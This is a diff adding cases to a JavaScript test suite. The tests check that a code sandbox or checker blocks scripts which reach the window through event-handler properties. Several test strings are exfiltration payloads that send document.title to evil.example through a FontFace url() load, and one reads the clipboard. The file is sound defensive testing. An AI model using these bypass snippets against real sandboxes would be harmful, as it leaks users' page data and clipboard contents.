@@ -1178,3 +1178,47 @@ describe('second audit (#48): an existing script element that never ran', () => 
     expect(blocks(`const i = document.createElement('img'); i.src = 'https://example.com/a.png'`, ['network'])).toBe(false)
   })
 })
+
+describe('second audit (#48): the window as a value through event-handler properties', () => {
+  const SNIPPETS = [
+    `document.body.onfocus = (e) => { const w = e.target; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() }`,
+    `const o = { m() { new this.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() } }; document.body.onfocus = o.m`,
+    `Object.assign(document.body, { onresize: (e) => { e.currentTarget.navigator.clipboard.readText().then((t) => { document.title = t }) } })`,
+    `window.addEventListener('message', (e) => { const w = e.source; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() })`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks variants that write a handler property or read a window from an event', () => {
+    for (const source of [
+      `document.body.onload = () => {}`,
+      `document.onclick = () => {}`,
+      `window.onmessage = () => {}`,
+      `document.querySelector('button').onclick = () => {}`,
+      `const b = document.createElement('button'); b.onclick = () => {}`,
+      `document.body['on' + 'focus'] = () => {}`,
+      `document.body.onfocus += 1`,
+      `({ a: document.body.onfocus } = { a: () => {} })`,
+      `document.addEventListener('storage', (e) => { e.storageArea.setItem('a', 'b') })`,
+      `document.addEventListener('message', (e) => { e.ports[0].postMessage('x') })`,
+      `window.addEventListener('click', (e) => { e.view })`,
+    ]) {
+      expect(blocks(source, ['storage']), source).toBe(true)
+    }
+  })
+
+  it('still passes addEventListener and handler-like names on plain data', () => {
+    for (const source of [
+      `document.querySelector('button').addEventListener('click', () => { document.title = 'x' })`,
+      `document.body.addEventListener('focus', (e) => { e.target.classList.add('x') }, true)`,
+      `window.addEventListener('keydown', (e) => { if (e.key === 'Escape') document.body.classList.remove('x') })`,
+      `const handlers = { onChange: () => {} }; handlers.onChange = () => {}`,
+      `const state = { once: true }; state.once = false`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
